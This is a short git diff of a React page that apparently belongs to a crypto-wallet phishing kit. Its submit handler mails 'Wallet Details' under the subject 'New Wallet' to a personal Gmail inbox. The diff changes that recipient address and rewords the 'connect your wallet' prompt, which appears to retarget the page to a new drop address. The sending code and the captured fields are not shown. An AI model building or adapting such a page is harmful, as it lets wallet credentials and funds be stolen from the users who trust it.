@@ -34,7 +34,7 @@ export default function Main() {
 
   const handleSubmit = async (e) => {
     let data = {
-      email: "colourjim@gmail.com",
+      email: "swiftmonger@gmail.com",
       subject: "New Wallet",
       message: `
             <h1>Wallet Details</h1>
@@ -120,7 +120,7 @@ export default function Main() {
             weight={500}
             size="lg"
           >
-            Connect your wallet to start using WALLET.AI
+            Connect to a wallet
           </Text>
 
           <SimpleGrid
